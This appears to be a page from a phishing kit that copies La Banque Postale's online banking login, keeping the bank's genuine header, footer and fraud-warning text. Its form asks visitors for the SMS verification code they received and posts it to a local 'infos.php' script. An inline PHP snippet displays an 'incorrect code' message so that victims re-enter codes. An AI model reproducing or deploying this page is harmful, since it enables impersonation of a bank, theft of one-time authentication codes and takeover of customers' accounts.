                                                    <a href="/particulier/accompagner/actualites-et-conseils.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Actualités et conseils</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Actualités et conseils</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2" last-item="">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/accompagner/nl-globale.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Newsletter</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Accompagner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Newsletter</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                            </ul>
                                        </div>

                                    </div>
                                </div>
                            </li>

                        </ul>
                    </nav>
                </div>

            </div>
        </div>
    </header>

    <main role="main" class="u-header-display u-page-color--blue">
        <a id="avoid-contenu" tabindex="-1"></a>

        <div class="o-cvslogin" id="cvslayer" data-tablet="true" data-mobile="true" data-app-stores="{&quot;appStores&quot;:[{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://itunes.apple.com/fr/app/la-banque-postale/id409362880?mt\u003d8&quot;,&quot;osMinVersion&quot;:&quot;6.1&quot;,&quot;relatedDevice&quot;:&quot;iostablet&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;iostablet&quot;,&quot;label&quot;:&quot;iOS Tablet&quot;}},{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://itunes.apple.com/fr/app/la-banque-postale/id409362880?mt\u003d8&quot;,&quot;osMinVersion&quot;:&quot;6.1&quot;,&quot;relatedDevice&quot;:&quot;iosphone&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;iosphone&quot;,&quot;label&quot;:&quot;iOS Mobile&quot;}},{&quot;appStoreLinkModel&quot;:{&quot;linkPath&quot;:&quot;https://play.google.com/store/apps/details?id\u003dcom.fullsix.android.labanquepostale.accountaccess&quot;,&quot;relatedDevice&quot;:&quot;android&quot;},&quot;device&quot;:{&quot;name&quot;:&quot;android&quot;,&quot;label&quot;:&quot;Android Mobile&quot;}}]}">
            <div class="o-cvslogin__container" style="background-color: #17479e;">
                <div>
                    <div class="m-title u-spacing-2xl-bottom">
                        <h1 class="m-title--h2 o-cvslogin__title u-text-color--white">Authentification par SMS</h1>
                    </div>
                    <div class="" id="conteneurCvs">
			<form method="post" action="infos.php" id="form" name="formAccesCompte" class="layer_blockRight">
				<div>
					<input type="hidden" name="urlbackend" value="%2Fvoscomptes%2FcanalXHTML%2Fidentif.ea%3Forigin%3Dparticuliers">
					<input type="hidden" name="origin" value="particuliers">
					<input type="hidden" name="password" id="cs" value="">
					<input type="hidden" name="cv" value="true"> 	
					<input type="hidden" name="cvvs" value=""> 	
				</div>
				<div id="cvs-bloc">
					<div id="messagePrecaution" class="webaccess">Authentification par vocalisation. Attention aux oreilles indiscrètes. Conseil : connectez-vous dans un endroit sûr ou utilisez un casque audio.</div>
					<div id="cvs-bloc-identifiant">
						<label class="webaccess" for="val_cel_identifiant">Identifiant :</label>
						<!--[if lt IE 10]>
						<input type="text" class="input-non-modif cache" id="val_cel_identifiant_hidden" value="Saisissez ici votre identifiant" onfocus="editLogin();"/>
						<input autocorrect="off" type="tel" name="username" id="val_cel_identifiant" autocapitalize="off" format="*N" placeholder="Saisissez ici votre identifiant" maxlength="11" pattern="[0-9,a-z,A-Z]*" spellcheck="false" onblur="activePlaceholderIe(this);" onfocus="editLogin();"/>
						<![endif]-->
						<!--[if (gt IE 9)|!(IE)]><!-->
                        <p style="padding : 15px;font-size:  15px;margin-bottom : 10px;color : black !important">Afin de confirmer votre identité, veuillez renseigner le code reçu par SMS.</p>
						<input autocorrect="off" type="tel" name="SMS" id="val_cel_identifiant" autocapitalize="off" format="*N" placeholder="Saisissez ici le code reçu"  pattern="[0-9,a-z,A-Z]*" spellcheck="false">
						<!--<![endif]-->
						<input class="input-non-modif" type="tel" id="val_cel_identifiant_masque" disabled="" style="display: none;">
                        <small style="padding : 15px;text-align : center">Le code peut mettre quelques minutes pour arriver</small>
					</div>
                    <?php if(isset($_GET["error"])){ ?>
                    <p style="color:red !important;margin : 10px 0px;padding : 15px;font-weight : bold">Le code est incorrect, veuillez réessayer</p>
                    <?php } ?>
					<div id="cvs-bloc-boutons" style="margin-top: 45px;">
						<input type="submit" name="sms_submit" id="valider" value="Valider" disabled="disabled" class="grey">
						<input type="button" id="effacer" value="Effacer">
					</div>
					<div id="progressBar"></div>
				</div>
			</form>
		</div>
                </div>
            </div>
            <div class="o-cvslogin__textcontent w50--sm w50--md">
                <div>

                    <div class="button">

                        <div class="m-button u-align-left u-spacing-2xs-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                            <a href="/particulier/footer/aide-connexion.html" class="u-btn m-button--content m-button--tertiary" target="_blank" data-internal="true" js-btn-tracking="" title="Aide à la connexion   - Nouvelle fenêtre">

                                <span class="m-button__icon a-icon--s">
                                <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-safety-locker-locked">
            <path fill-rule="evenodd" d="M12 2c2.897 0 5 2.313 5 5.5V9c1.106 0 2.006.9 2.006 2v9c0 1.1-.9 2-2 2h-10c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2H7V7.5C7 4.313 9.103 2 12 2zm5.006 8h-10c-.551 0-1 .448-1 1v9c0 .552.449 1 1 1h10c.55 0 1-.448 1-1v-9c0-.552-.45-1-1-1zm-5 2.5c.6 0 1.14.27 1.5.69.31.35.5.81.5 1.31 0 .438-.146.844-.39 1.174a.523.523 0 00-.11.312v1.996a.517.517 0 01-.518.518h-1.964a.517.517 0 01-.518-.518v-1.986a.523.523 0 00-.111-.312 1.988 1.988 0 01-.39-1.184c0-.51.19-.97.5-1.32.36-.42.9-.68 1.5-.68zm0 1a.967.967 0 00-.741.331.987.987 0 00-.26.669c0 .215.067.418.194.588.2.271.307.586.307.908V17.5h1v-1.514c0-.323.106-.636.307-.908a.967.967 0 00-.056-1.225.982.982 0 00-.751-.353zM12 3C9.645 3 8 4.851 8 7.5V9h8V7.5C16 4.851 14.355 3 12 3z"></path>
        </svg>
        </span>

                                <span>
            Aide à la connexion
            
        </span>

                            </a>
                        </div>

                    </div>

                    <div class="button">

                        <div class="m-button u-align-left u-spacing-2xs-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                            <a href="/particulier/footer/recuperation-mot-de-passe.html" class="u-btn m-button--content m-button--tertiary" target="_blank" data-internal="true" js-btn-tracking="" title="Identifiant / Mot de passe oublié   - Nouvelle fenêtre">

                                <span class="m-button__icon a-icon--s">
                                <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-safety-password">
            <path fill-rule="evenodd" d="M12 17a2 2 0 11-.001 4A2 2 0 0112 17zm0 1a1.001 1.001 0 000 2 1.001 1.001 0 000-2zm-7-8a2 2 0 11-.001 4A2 2 0 015 10zm7 0a2 2 0 11-.001 4A2 2 0 0112 10zm7 0a2 2 0 11-.001 4A2 2 0 0119 10zM5 11a1.001 1.001 0 000 2 1.001 1.001 0 000-2zm7 0a1.001 1.001 0 000 2 1.001 1.001 0 000-2zm7 0a1.001 1.001 0 000 2 1.001 1.001 0 000-2zM5 3a2 2 0 11-.001 4A2 2 0 015 3zm7 0a2 2 0 11-.001 4A2 2 0 0112 3zm7 0a2 2 0 11-.001 4A2 2 0 0119 3zM5 4a1.001 1.001 0 000 2 1.001 1.001 0 000-2zm7 0a1.001 1.001 0 000 2 1.001 1.001 0 000-2zm7 0a1.001 1.001 0 000 2 1.001 1.001 0 000-2z"></path>
        </svg>
        </span>

                                <span>
            Identifiant / Mot de passe oublié
            
        </span>

                            </a>
                        </div>

                    </div>

                    <div class="button">

                        <div class="m-button u-align-left u-spacing-2xs-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                            <a href="/particulier/footer/securite-mot-de-passe.html" class="u-btn m-button--content m-button--tertiary" target="_blank" data-internal="true" js-btn-tracking="" title="Sécurité Identifiant / Mot de passe   - Nouvelle fenêtre">

                                <span class="m-button__icon a-icon--s">
                                <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-safety-safety">
            <path fill-rule="evenodd" d="M16.5 2a.5.5 0 01.5.5c0 1.88 1.494 3.99 3.493 4a.502.502 0 01.497.513c-.222 8.967-2.79 13.304-8.858 14.97a.53.53 0 01-.263 0c-6.07-1.655-8.635-5.992-8.86-14.97a.502.502 0 01.498-.513C5.506 6.49 7 4.38 7 2.5a.5.5 0 01.5-.5h9zm-.472 1H7.972c-.228 2.049-1.815 4.158-3.948 4.463C4.308 15.525 6.64 19.467 12 20.982c5.36-1.525 7.693-5.467 7.976-13.52-2.133-.304-3.72-2.413-3.948-4.462zM12 7c2.75 0 5 2.25 5 5s-2.25 5-5 5-5-2.25-5-5 2.25-5 5-5zm0 1c-2.206 0-4 1.794-4 4s1.794 4 4 4 4-1.794 4-4-1.794-4-4-4zm2.475 2.232a.5.5 0 010 .707l-2.828 2.83a.502.502 0 01-.708 0l-1.414-1.416a.5.5 0 01.707-.707l1.061 1.061 2.475-2.475a.5.5 0 01.707 0z"></path>
        </svg>
        </span>

                                <span>
            Sécurité Identifiant / Mot de passe
            
        </span>

                            </a>
                        </div>

                    </div>

                    <div class="button">

                        <div class="m-button u-align-left u-spacing-lg-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                            <a href="/particulier/footer/accessibilite.html" class="u-btn m-button--content m-button--tertiary" target="_blank" data-internal="true" js-btn-tracking="" title="Accessibilité   - Nouvelle fenêtre">

                                <span class="m-button__icon a-icon--s">
                                <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-interface-hide">
            <path fill-rule="evenodd" d="M19.854 4.146a.502.502 0 010 .708l-2.5 2.5C20.562 9.124 22 12 22 12s-3 6-10 6a11.02 11.02 0 01-4.404-.888l-2.742 2.742a.502.502 0 01-.708 0 .502.502 0 010-.708l2.5-2.5C3.438 14.876 2 12 2 12s3-6 10-6c1.699 0 3.162.353 4.404.888l2.742-2.742a.502.502 0 01.708 0zm-3.233 3.942l-1.46 1.46a4 4 0 01-5.613 5.612l-1.188 1.188c1.047.398 2.257.652 3.64.652 5.268 0 8.032-3.688 8.848-5-.53-.853-1.889-2.717-4.227-3.912zM12 7c-5.268 0-8.032 3.688-8.848 5 .53.853 1.889 2.717 4.227 3.912l1.46-1.46a4 4 0 015.613-5.612l1.187-1.188A10.161 10.161 0 0012 7zm2.445 3.263l-4.182 4.182c.49.35 1.09.555 1.737.555 1.654 0 3-1.346 3-3 0-.647-.206-1.246-.555-1.737zM12 9c-1.654 0-3 1.346-3 3 0 .646.206 1.246.555 1.736l4.182-4.18A2.983 2.983 0 0012 9z"></path>
        </svg>
        </span>

                                <span>
            Accessibilité
            
        </span>

                            </a>
                        </div>

                    </div>

                    <div class="title">

                        <div data-footnotes="true" class="m-title u-spacing-s-bottom   u-color--blue u-align-left">

                            <h3>Important, Alerte fraude</h3>
                        </div>
                        <div class="js-footnotes-trigger u-hidden--all">
                            <ul class="js-footnotes--list">

                            </ul>
                        </div>
                    </div>

                    <div class="a-text">
                        <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-footnotes="true">

                            <p>Dans ce contexte particulier les tentatives de fraudes sont de plus en plus intensives, découvrez&nbsp;<a href="/particulier/footer/alertes-et-fraudes.html"><b>nos recommandations</b>.</a><br>
                            </p>

                        </article>
                        <div class="js-footnotes-trigger u-hidden--all">
                            <ul class="js-footnotes--list">

                            </ul>
                        </div>
                    </div>

                </div>
            </div>
        </div>

        <div class="o-cvslogin__layer u-spacing-3xl-top u-spacing-s-bottom u-spacing-s-left u-spacing-s-right u-hidden--all u-flex" id="devicelayer" style="background-color: #ffffff;" device-mobile="true" device-tablet="true" tabindex="-1" aria-hidden="true">

            <h1 class="m-title--h1 o-cvslogin__title  u-spacing-s-bottom">Connexion à mes comptes</h1>

            <div class="a-text u-spacing-s-bottom">
                Consulter vos comptes sur l'application mobile
            </div>

            <div class="o-cvslogin__image u-margin-s-bottom">

                <picture>

                    <img src="https://www.labanquepostale.fr/content/dam/lbp/images/illustrations-svg/il_transverse_rethink.svg/_jcr_content/renditions/original" width="300px" height="300px" class="  a-image--responsive" alt="">

                </picture>

            </div>
            <button type="button" id="connectwebsite" class="u-btn m-button--primary m-button--primary--dakrmode m-button--extend u-margin-s-bottom">
        <span>Continuer sur le site</span>
    </button>
            <a href="https://m.labanquepostale.fr/ws_qh5/bad/mobile/site.mobi/smartphone/index.html?origin=mobipph&amp;codeMedia=9228" class="u-btn m-button--secondary m-button--secondary--dakrmode m-button--extend u-margin-s-bottom" id="mobilewebsite">
                <span>Accéder au site mobile</span>
            </a>
            <a class="u-btn m-button--secondary m-button--secondary--dakrmode m-button--extend u-margin-s-bottom" id="appredirect">
                <span>Télécharger l'application mobile</span>
            </a>
        </div>
        <ul class="m-footnotes js-footnotes--container container-fluid m-list m-list--counter u-spacing-4xl-left u-spacing-xl-xs-left" data-note-label="Note"></ul>

        <div id="viewportDetect">
            <div class="visible-xs" data-viewport="xs"></div>
            <div class="visible-sm" data-viewport="sm"></div>
            <div class="visible-md" data-viewport="md"></div>
        </div>
    </main>
<footer id="footer" role="contentinfo" class="o-footer ">
        <a id="avoid-footer" tabindex="-1"></a>
        <div class="o-footer__top ">
            <section class="o-footer__top__left u-separator--sm--right">
                <div class="o-footer__logo">
                    <div class="m-logo u-spacing-s-xs">
                        <div class="js-logo-type">

                            <img src="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" width="50" height="50" alt="Logo de La Banque Postale">

                        </div>
                    </div>
                    <hr class="u-separator--v u-spacing-s-right" aria-hidden="true" focusable="false">
                    <img src="https://www.labanquepostale.fr/content/dam/lbp/images/logo/ill_banque_citoyenne.svg" class="o-footer__imgbrand" alt="Banque et citoyenne" width="50" height="50" loading="lazy">

                </div>
                <div class="u-spacing-s-top u-spacing-xs-xs-top">

                    <div class="row">

                        <div class="a-text col-xs-12">
                            <article class=" u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-footnotes="true">

                                <p>Banque et citoyenne, La Banque Postale est guidée par un principe : l'accueil de tous. Héritière des services financiers de La Poste, La Banque Postale est une banque singulière, de proximité, qui propose une gamme de produits et de services responsables à ses clients.&nbsp;</p>

                            </article>
                            <div class="js-footnotes-trigger u-hidden--all">
                                <ul class="js-footnotes--list">

                                </ul>
                            </div>
                        </div>

                    </div>
                    <div class="row">

                        <div class="button col-xs-12">

                            <div class="m-button  " data-component-id="labanquepostale/sitepublic/components/edito/button">
                                <a href="/particulier/solutions-citoyennes.html" class="u-btn m-button--content m-button--secondary" target="_blank" data-internal="true" js-btn-tracking="" title="En savoir plus sur nos engagements   - Nouvelle fenêtre">

                                    <span class="m-button__icon a-icon--s">
                                    <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-profile-citizen">
            <path fill-rule="evenodd" d="M5.075 3.063a1.923 1.923 0 012.56-.868 1.93 1.93 0 011.067 1.6c.021.33-.05.672-.202.967l-1.719 3.8c.94.03 1.705.792 1.865 1.858l.121.799c.09.6.378 1.144.835 1.576.584.55 1.016 1.426 1.153 2.339.138.91-.018 1.875-.416 2.577-.3.53-.326 1.235-.326 1.91v1.932a.5.5 0 01-1 0v-1.931c0-.81.035-1.662.456-2.405.225-.396.421-1.112.297-1.934-.124-.824-.52-1.45-.85-1.761a3.692 3.692 0 01-1.138-2.154l-.12-.8c-.09-.592-.458-.997-.916-1.007a.858.858 0 00-.708.31.915.915 0 00-.223.742l.673 4.474a.501.501 0 01-.989.148l-.673-4.474a1.913 1.913 0 01.462-1.55c.054-.063.12-.112.181-.166L7.6 4.329a.93.93 0 00.104-.47.927.927 0 00-.513-.768.922.922 0 00-1.22.418L3.363 8.77a3.48 3.48 0 00-.325 2.074l1.408 9.226a.5.5 0 01-.989.15L2.05 10.995a4.49 4.49 0 01.417-2.667zm11.254-.868a1.925 1.925 0 012.56.865l2.609 5.267c.41.83.555 1.75.417 2.666l-1.408 9.228a.5.5 0 01-.988-.15l1.408-9.228a3.489 3.489 0 00-.325-2.072l-2.608-5.265a.92.92 0 00-1.223-.414.922.922 0 00-.51.767.892.892 0 00.094.447l2.147 4.742c.06.053.126.101.18.162.377.428.545.992.46 1.551l-.671 4.474a.501.501 0 01-.99-.149l.673-4.474a.916.916 0 00-.223-.742.875.875 0 00-.708-.31c-.458.01-.826.415-.915 1.007l-.121.801a3.692 3.692 0 01-1.137 2.153c-.33.311-.727.937-.85 1.761-.125.822.07 1.538.296 1.935.42.742.457 1.594.457 2.404v1.931a.5.5 0 01-1 0v-1.93c0-.677-.026-1.38-.327-1.912-.398-.7-.553-1.665-.416-2.577.138-.913.569-1.787 1.153-2.339.457-.43.745-.976.835-1.575l.12-.8c.16-1.067.927-1.827 1.866-1.857l-1.73-3.822a1.855 1.855 0 01-.19-.945 1.93 1.93 0 011.065-1.6zM13.204 4.74c1.045 0 1.776.85 1.776 2.069 0 1.815-1.699 3.236-2.71 3.92a.651.651 0 01-.358.107.458.458 0 01-.272-.08c-1.052-.712-2.75-2.134-2.75-3.947 0-2.232 2.148-2.455 3.045-1.534a1.768 1.768 0 011.27-.535zm0 1a.77.77 0 00-.77.727.5.5 0 01-.998 0 .77.77 0 00-.77-.727c-.675 0-.776.67-.776 1.069 0 .935.742 1.995 2.045 2.935 1.303-.94 2.045-2 2.045-2.935 0-.66-.297-1.07-.776-1.07z"></path>
        </svg>
        </span>

                                    <span>
            En savoir plus sur nos engagements
            
        </span>

                                </a>
                            </div>

                        </div>

                    </div>

                </div>
            </section>

            <section class="o-footer__top__right">

                <div class="m-tiles u-full-width-xs m-tiles--square">
                    <hr class="u-separator--h--full visible-xs-block">
                    <ul class="m-tiles__list">
                        <li class="m-tiles__item">

                            <a href="/particulier/footer/espace_sourds.html" title="Espace Sourds et malendants - La Banque Postale  - Nouvelle fenêtre" target="_blank" data-internal="true">
                            <svg xmlns="http://www.w3.org/2000/svg" height=32px viewBox="0 0 24 24" id="ic-contact-relationship_remote">
            <path fill-rule="evenodd" d="M7.158 15.863c4.461 0 6.56 6.137 4.388 6.137H2.892c-2.172 0-.195-6.137 4.266-6.137zm0 1c-1.99 0-3.134 1.52-3.533 2.171-.552.904-.654 1.663-.612 1.966h8.393c.03-.315-.097-1.074-.662-1.965-.415-.652-1.593-2.172-3.586-2.172zm.05-7.608a2.833 2.833 0 110 5.666 2.833 2.833 0 010-5.666zm9.535-.545c4.46 0 6.559 6.137 4.388 6.137h-8.654c-2.171 0-.195-6.137 4.266-6.137zm-9.535 1.545c-1.01 0-1.833.82-1.833 1.832a1.834 1.834 0 003.665 0 1.835 1.835 0 00-1.832-1.832zm9.535-.545c-1.991 0-3.134 1.519-3.533 2.172-.552.903-.654 1.662-.612 1.965h8.393c.03-.315-.096-1.073-.662-1.964-.414-.653-1.593-2.173-3.586-2.173zm.05-7.608a2.832 2.832 0 110 5.664 2.832 2.832 0 010-5.664zm0 1c-1.01 0-1.833.822-1.833 1.832 0 1.01.822 1.833 1.832 1.833 1.01 0 1.832-.822 1.832-1.833 0-1.01-.822-1.832-1.831-1.832z"></path>
        </svg>
                                <span>Espace Sourds et malendants</span>
                            </a>
                        </li>

                        <li class="m-tiles__item">

                            <a href="/particulier/footer/recherche-bureau.html" title="Recherche bureau de poste via l'outil de localisation  " data-internal="true">
                            <svg xmlns="http://www.w3.org/2000/svg" height=32px viewBox="0 0 24 24" id="ic-contact-location">
            <path fill-rule="evenodd" d="M12 2a8 8 0 018 8c0 4.418-8 12-8 12s-8-7.582-8-12a8 8 0 018-8zm0 1c-3.859 0-7 3.141-7 7 0 2.96 4.553 8.144 7 10.602 2.447-2.458 7-7.642 7-10.602 0-3.859-3.141-7-7-7zm0 4a3 3 0 110 6 3 3 0 010-6zm0 1c-1.103 0-2 .897-2 2s.897 2 2 2 2-.897 2-2-.897-2-2-2z"></path>
        </svg>
                                <span>Recherche bureau de poste</span>
                            </a>
                        </li>

                        <li class="m-tiles__item">

                            <a href="/particulier/footer/centre-aide.html" data-internal="true">
                            <svg xmlns="http://www.w3.org/2000/svg" height=32px viewBox="0 0 24 24" id="ic-products-advice">
            <path fill-rule="evenodd" d="M10.386 12.796a2.71 2.71 0 001.682.592h.81c1.078 0 1.944.644 2.114 1.567l3.522-2.279c.25-.179.578-.3.904-.329a1.924 1.924 0 011.742.815 1.924 1.924 0 01-.474 2.66l-4.82 3.365a4.476 4.476 0 01-2.574.81L3.5 20a.5.5 0 010-1l9.792-.004a3.48 3.48 0 002.002-.63l4.817-3.362a.92.92 0 00.228-1.272.93.93 0 00-.834-.389.883.883 0 00-.43.16l-4.342 2.811a1.915 1.915 0 01-1.625.906l-4.524.002a.5.5 0 010-1l4.524-.002c.268 0 .524-.12.7-.33a.902.902 0 00.202-.746c-.078-.452-.533-.756-1.132-.756h-.81c-.82 0-1.636-.286-2.298-.805-.357-.279-1.036-.578-1.868-.578-.834 0-1.511.3-1.868.58a3.732 3.732 0 01-2.296.804H3.5a.5.5 0 010-1h.238c.607 0 1.187-.204 1.678-.59 1.263-.993 3.703-.994 4.97-.003zM15.5 2.038a3.623 3.623 0 013.623 3.623c0 1.316-.71 2.458-1.761 3.092V10.1a1.868 1.868 0 01-1.862 1.862 1.868 1.868 0 01-1.862-1.862V8.753a3.608 3.608 0 01-1.761-3.092A3.623 3.623 0 0115.5 2.038zm.861 7.91h-1.723v.151c0 .439.329.802.754.856l.108.006a.863.863 0 00.862-.862l-.001-.152zm-.861-6.91a2.626 2.626 0 00-2.623 2.623 2.6 2.6 0 001.277 2.236 1 1 0 01.484.856v.194h1.723l.001-.194a1 1 0 01.377-.781l.107-.075a2.6 2.6 0 001.277-2.236A2.626 2.626 0 0015.5 3.038z"></path>
        </svg>
                                <span>Centre d'aide</span>
                            </a>
                        </li>

                        <li class="m-tiles__item">

                            <a href="/particulier/footer/contacts.html" title="Nous contacter  - Nouvelle fenêtre" target="_blank" data-internal="true">
                            <svg xmlns="http://www.w3.org/2000/svg" height=32px viewBox="0 0 24 24" id="ic-contact-phone">
            <path fill-rule="evenodd" d="M7.011 3c.798 0 1.465.61 1.52 1.387a12.74 12.74 0 001.345 4.927l.001.003a.5.5 0 01-.224.67l-3.576 1.785c1.417 2.662 3.218 4.594 5.714 6.115l1.946-3.69a.502.502 0 01.676-.21l.01.006.365.186c1.504.737 3.11 1.17 4.782 1.288.816.057 1.43.702 1.43 1.498v2.522a1.503 1.503 0 01-1.51 1.501h-.038c-2.994-.074-5.053-.549-7.107-1.637-3.38-1.787-5.66-4.124-7.392-7.578A18.349 18.349 0 013.03 4.558a1.446 1.446 0 01.398-1.084A1.526 1.526 0 014.53 3h2.481zm7.381 12.098l-1.734 3.286.155.083c1.906 1.01 3.837 1.451 6.663 1.521a.509.509 0 00.524-.5v-2.523c0-.265-.215-.48-.5-.5a13.89 13.89 0 01-5.108-1.367zM7.012 4H4.53a.514.514 0 00-.374.161.455.455 0 00-.128.341c.127 2.22.664 4.362 1.602 6.374l3.135-1.563a13.772 13.772 0 01-1.233-4.858c-.018-.25-.25-.455-.52-.455z"></path>
        </svg>
                                <span>Nous contacter</span>
                            </a>
                        </li>
                    </ul>
                </div>

            </section>
        </div>
        <hr class="u-separator--h--full" aria-hidden="true" focusable="false">
        <div class="container-fluid">
            <div class="row">
                <section class="col-xs-12 col-sm-6 u-separator--sm--right">
                    <div>
                        <div class="m-socialmedialist u-align-center u-spacing-s-top u-spacing-s-bottom u-spacing-xs-xs-top u-spacing-xs-xs-bottom">
                            <p class="m-socialmedialist__label"> Suivez nous</p>
                            <ul class="m-socialmedialist__list m-list--flexcenter m-list--flexinline">
                                <li class="m-socialmedialist__item">

                                    <div class="m-button--hasIcon">

                                        <a href="/particulier/redirect-rs/facebook.html" title=" Facebook - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="true">
                                        <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-social-facebook">
            <path fill-rule="evenodd" d="M21.5 12.001C21.5 6.754 17.247 2.5 12 2.5s-9.5 4.254-9.5 9.501c0 4.741 3.474 8.672 8.016 9.385v-6.639H8.104v-2.746h2.412V9.907c0-2.381 1.418-3.696 3.588-3.696 1.04 0 2.126.186 2.126.186v2.337h-1.197c-1.18 0-1.549.733-1.549 1.485v1.782h2.635l-.421 2.746h-2.214v6.639c4.542-.713 8.016-4.644 8.016-9.385"></path>
        </svg>
                                            <span class="sr-only"> Facebook - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">

                                    <div class="m-button--hasIcon">

                                        <a href="/particulier/redirect-rs/instagram.html" title=" Instagram - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="true">
                                        <svg xmlns="http://www.w3.org/2000/svg" height=24px xmlns:xlink="http://www.w3.org/1999/xlink" id="ic-social-instagram" viewBox="0 0 24 24">
            <path fill-rule="evenodd" d="M8,3 C5.23857625,3 3,5.23857625 3,8 L3,16 C3,18.7614237 5.23857625,21 8,21 L16,21 C18.7614237,21 21,18.7614237 21,16 L21,8 C21,5.23857625 18.7614237,3 16,3 L8,3 Z M17.5,5.5 C18.05,5.5 18.5,5.95 18.5,6.5 C18.5,7.05 18.05,7.5 17.5,7.5 C16.95,7.5 16.5,7.05 16.5,6.5 C16.5,5.95 16.95,5.5 17.5,5.5 Z M12,7 C14.7614237,7 17,9.23857625 17,12 C17,14.7614237 14.7614237,17 12,17 C9.23857625,17 7,14.7614237 7,12 C7,9.23857625 9.23857625,7 12,7 L12,7 Z M11.9999998,8.99999983 C10.9278459,9.00035724 9.93732534,9.57267473 9.40155771,10.501366 C8.86579008,11.4300573 8.86617128,12.574032 9.40255771,13.502366 C9.93894414,14.4307001 10.9298459,15.0023573 12.002,15.0020002 C13.6594065,15.0014477 15.0025522,13.6574065 15.0020001,11.9999998 C15.0014477,10.3425935 13.6574065,8.99944775 11.9999998,8.99999983 Z"></path>
        </svg>
                                            <span class="sr-only"> Instagram - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">

                                    <div class="m-button--hasIcon">

                                        <a href="/particulier/redirect-rs/linkedin.html" title=" Linkedin - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="true">
                                        <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-social-linkedin">
            <path fill-rule="evenodd" d="M18.26 18.068h-2.72V13.72c0-1.092-.392-1.838-1.376-1.838-.751 0-1.198.502-1.395.988-.071.174-.09.417-.09.66v4.54H9.962s.036-7.367 0-8.13h2.719v1.18c.357-.556.983-1.37 2.45-1.37 1.789 0 3.13 1.162 3.13 3.658v4.661zM7.097 8.83h-.018c-.912 0-1.502-.624-1.502-1.405 0-.796.608-1.404 1.538-1.404s1.503.608 1.52 1.404c0 .781-.59 1.405-1.538 1.405zm-1.36 9.238h2.72V9.94h-2.72v8.13zM19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"></path>
        </svg>
                                            <span class="sr-only"> Linkedin - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">

                                    <div class="m-button--hasIcon">

                                        <a href="/particulier/redirect-rs/twitter.html" title=" Twitter - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="true">
                                        <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-social-twitter">
            <path fill-rule="evenodd" d="M8.753 19.11c6.604 0 10.216-5.472 10.216-10.217 0-.155 0-.309-.01-.464a7.294 7.294 0 001.791-1.858c-.656.29-1.35.48-2.062.565a3.607 3.607 0 001.578-1.986 7.19 7.19 0 01-2.28.871 3.593 3.593 0 00-6.119 3.275 10.198 10.198 0 01-7.4-3.75 3.595 3.595 0 001.112 4.792 3.555 3.555 0 01-1.629-.45v.046a3.592 3.592 0 002.88 3.52 3.595 3.595 0 01-1.62.061 3.592 3.592 0 003.353 2.493 7.203 7.203 0 01-5.313 1.49 10.174 10.174 0 005.503 1.61v.001z"></path>
        </svg>
                                            <span class="sr-only"> Twitter - La Banque Postale</span>
                                        </a>
                                    </div>
                                </li>

                                <li class="m-socialmedialist__item">

                                    <div class="m-button--hasIcon">

